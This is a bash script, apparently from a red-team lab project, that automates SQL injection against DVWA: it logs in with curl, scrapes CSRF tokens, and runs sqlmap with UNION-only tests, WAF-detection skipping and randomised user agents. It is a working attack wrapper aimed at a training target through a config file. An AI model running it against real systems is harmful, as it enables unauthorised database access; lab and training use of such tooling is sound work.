#!/bin/bash
# ============================================================================
# CYBERFORTRESS REDOPS - SQL Injection using sqlmap
# ============================================================================
# MITRE ATT&CK: T1190 - Exploit Public-Facing Application
#
# Wrapper script for sqlmap to attack DVWA
# Usage: ./sqli_attack.sh
# ============================================================================

# Load config
CONFIG_FILE="$(dirname "$0")/config.json"

if [ ! -f "$CONFIG_FILE" ]; then
    echo "[-] Config file not found: $CONFIG_FILE"
    exit 1
fi

# Parse config using jq
HOST=$(jq -r '.target.host' "$CONFIG_FILE")
PORT=$(jq -r '.target.port' "$CONFIG_FILE")
PROTOCOL=$(jq -r '.target.protocol' "$CONFIG_FILE")
BASE_URL=$(jq -r '.target.base_url' "$CONFIG_FILE")
LOGIN_URL=$(jq -r '.target.login_url' "$CONFIG_FILE")
USERNAME=$(jq -r '.credentials.username' "$CONFIG_FILE")
PASSWORD=$(jq -r '.credentials.password' "$CONFIG_FILE")
SECURITY_LEVEL=$(jq -r '.attack.security_level' "$CONFIG_FILE")

# Build URLs
if [ "$PORT" == "80" ] || [ "$PORT" == "443" ]; then
    TARGET_URL="${PROTOCOL}://${HOST}${BASE_URL}"
    LOGIN_FULL="${PROTOCOL}://${HOST}${LOGIN_URL}"
else
    TARGET_URL="${PROTOCOL}://${HOST}:${PORT}${BASE_URL}"
    LOGIN_FULL="${PROTOCOL}://${HOST}:${PORT}${LOGIN_URL}"
fi

echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║     SQL INJECTION ATTACK (sqlmap)                                 ║"
echo "║     MITRE ATT&CK: T1190 - Exploit Public-Facing Application       ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo ""
echo "[*] Target: $TARGET_URL"
echo "[*] Credentials: $USERNAME / $PASSWORD"
echo "[*] Security Level: $SECURITY_LEVEL"
echo ""

# Check if sqlmap is installed
if ! command -v sqlmap &> /dev/null; then
    echo "[-] sqlmap not found! Install with: apt install sqlmap"
    exit 1
fi

# Step 1: Get DVWA cookies via curl
echo "[*] Logging into DVWA..."

# Get initial cookies and CSRF token
COOKIES_FILE="/tmp/dvwa_cookies.txt"
curl -s -c "$COOKIES_FILE" -b "$COOKIES_FILE" "$LOGIN_FULL" > /tmp/dvwa_login.html

# Extract CSRF token
CSRF_TOKEN=$(grep -oP "user_token'\s+value='\K[^']+" /tmp/dvwa_login.html)

# Login
curl -s -c "$COOKIES_FILE" -b "$COOKIES_FILE" \
    -d "username=$USERNAME&password=$PASSWORD&Login=Login&user_token=$CSRF_TOKEN" \
    "$LOGIN_FULL" > /dev/null

# Set security level
SECURITY_URL="${PROTOCOL}://${HOST}/security.php"
curl -s -c "$COOKIES_FILE" -b "$COOKIES_FILE" "$SECURITY_URL" > /tmp/dvwa_security.html
CSRF_TOKEN2=$(grep -oP "user_token'\s+value='\K[^']+" /tmp/dvwa_security.html)
curl -s -c "$COOKIES_FILE" -b "$COOKIES_FILE" \
    -d "security=$SECURITY_LEVEL&seclev_submit=Submit&user_token=$CSRF_TOKEN2" \
    "$SECURITY_URL" > /dev/null

# Extract session cookie
PHPSESSID=$(grep PHPSESSID "$COOKIES_FILE" | awk '{print $7}')
SECURITY_COOKIE=$(grep security "$COOKIES_FILE" | awk '{print $7}')

if [ -z "$PHPSESSID" ]; then
    echo "[-] Failed to login to DVWA!"
    exit 1
fi

echo "[+] Logged in! Session: $PHPSESSID"
echo "[+] Security level set to: $SECURITY_LEVEL"
echo ""

# Step 2: Run sqlmap
echo "[*] Starting sqlmap..."
echo "============================================================"

# sqlmap command - LIMITED to ~20 requests
# Use --test-filter to only run specific tests
sqlmap -u "${TARGET_URL}?id=1&Submit=Submit" \
    --cookie="PHPSESSID=$PHPSESSID; security=$SECURITY_LEVEL" \
    --batch \
    --technique=U \
    --level=1 \
    --risk=1 \
    --test-filter="UNION" \
    --skip-waf \
    --no-cast \
    --random-agent \
    --output-dir="$(dirname "$0")/sqlmap_output" \
    --flush-session

# Options explained:
#   --technique=U     : Only UNION-based (fastest)
#   --level=1         : Minimal tests
#   --risk=1          : Minimal payloads
#   --test-filter     : Only run tests matching "UNION"
#   --no-cast         : Skip CAST/CONVERT tests
#   --skip-waf        : Skip WAF detection

echo ""
echo "============================================================"
echo "[+] Attack complete! Results saved to: sqlmap_output/"
echo ""

# Cleanup
rm -f /tmp/dvwa_login.html /tmp/dvwa_security.html
